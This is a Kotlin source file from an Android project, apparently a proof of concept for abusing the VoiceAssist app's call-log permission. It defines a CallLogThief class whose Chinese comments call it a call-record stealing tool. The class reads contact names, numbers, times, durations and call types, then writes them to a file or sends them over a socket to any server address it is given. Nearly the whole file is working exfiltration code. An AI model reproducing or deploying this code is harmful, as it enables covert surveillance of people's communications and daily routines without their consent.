package xyz.mufanc.vap.util

import android.content.ContentResolver
import android.database.Cursor
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.File
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * 寄生提权：通话记录窃取工具
 * 利用 VoiceAssist 的 READ_CALL_LOG 权限获取用户的通信频率与物理作息。
 */
class CallLogThief {

    companion object {
        private const val TAG = "CallLogThief"

        // Android 标准通话记录的 URI
        private val CALLLOG_URI = CallLog.Calls.CONTENT_URI

        // 需要提取的核心字段
        private const val COLUMN_NAME = CallLog.Calls.CACHED_NAME
        private const val COLUMN_NUMBER = CallLog.Calls.NUMBER
        private const val COLUMN_DATE = CallLog.Calls.DATE
        private const val COLUMN_DURATION = CallLog.Calls.DURATION
        private const val COLUMN_TYPE = CallLog.Calls.TYPE
    }

    private fun getCallTypeString(type: Int): String {
        return when (type) {
            CallLog.Calls.INCOMING_TYPE -> "呼入"
            CallLog.Calls.OUTGOING_TYPE -> "呼出"
            CallLog.Calls.MISSED_TYPE -> "未接"
            CallLog.Calls.VOICEMAIL_TYPE -> "语音留言"
            CallLog.Calls.REJECTED_TYPE -> "拒接"
            CallLog.Calls.BLOCKED_TYPE -> "拦截"
            else -> "未知 ($type)"
        }
    }

    /**
     * 窃取通话记录并保存到设备本地文件（USB 模式，供 adb pull）
     */
    fun stealToFile(outputPath: String, limit: Int = 50): Int {
        return try {
            val callLogArray = queryCallLogs(limit)
            File(outputPath).writeText(callLogArray.toString(4))
            Log.i(TAG, "Plaintext call log data written to $outputPath")
            callLogArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write call log file", e)
            0
        }
    }

    /**
     * 窃取通话记录并通过 socket 回传（WiFi 模式）
     */
    fun stealToSocket(serverAddress: String, serverPort: Int, limit: Int = 50): Int {
        return try {
            val callLogArray = queryCallLogs(limit)
            val socket = Socket(serverAddress, serverPort)
            val outputStream = BufferedOutputStream(socket.getOutputStream())
            val payload = callLogArray.toString().toByteArray(Charsets.UTF_8)

            outputStream.write(payload)
            outputStream.flush()
            socket.shutdownOutput()

            outputStream.close()
            socket.close()

            Log.i(TAG, "Plaintext call logs sent to $serverAddress:$serverPort")
            callLogArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to exfiltrate call logs", e)
            0
        }
    }

    private fun queryCallLogs(limit: Int): JSONArray {
        val callLogArray = JSONArray()
        val resolver: ContentResolver = Ctx.app.contentResolver
        val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        var cursor: Cursor? = null
        try {
            cursor = resolver.query(
                CALLLOG_URI,
                arrayOf(COLUMN_NAME, COLUMN_NUMBER, COLUMN_DATE, COLUMN_DURATION, COLUMN_TYPE),
                null,
                null,
                "$COLUMN_DATE DESC LIMIT $limit"
            )

            if (cursor == null) {
                Log.w(TAG, "Cursor is null, failed to read call logs")
                return callLogArray
            }

            val nameIdx = cursor.getColumnIndex(COLUMN_NAME)
            val numberIdx = cursor.getColumnIndex(COLUMN_NUMBER)
            val dateIdx = cursor.getColumnIndex(COLUMN_DATE)
            val durationIdx = cursor.getColumnIndex(COLUMN_DURATION)
            val typeIdx = cursor.getColumnIndex(COLUMN_TYPE)

            while (cursor.moveToNext()) {
                val rawName = if (nameIdx != -1 && !cursor.isNull(nameIdx)) cursor.getString(nameIdx) else "陌生人"
                val rawNumber = if (numberIdx != -1) cursor.getString(numberIdx) else "未知号码"
                val rawDate = if (dateIdx != -1) cursor.getLong(dateIdx) else 0L
                val rawDuration = if (durationIdx != -1) cursor.getLong(durationIdx) else 0L
                val rawTypeInt = if (typeIdx != -1) cursor.getInt(typeIdx) else 0

                val logObj = JSONObject()
                logObj.put("name", rawName)
                logObj.put("number", rawNumber)
                logObj.put("date", format.format(Date(rawDate)))
                logObj.put("duration", rawDuration)
                logObj.put("type", getCallTypeString(rawTypeInt))
                callLogArray.put(logObj)
            }

            Log.i(TAG, "Successfully extracted ${callLogArray.length()} plaintext call logs")
        } catch (e: Exception) {
            Log.e(TAG, "Error while stealing call logs", e)
        } finally {
            cursor?.close()
        }

        return callLogArray
    }
}
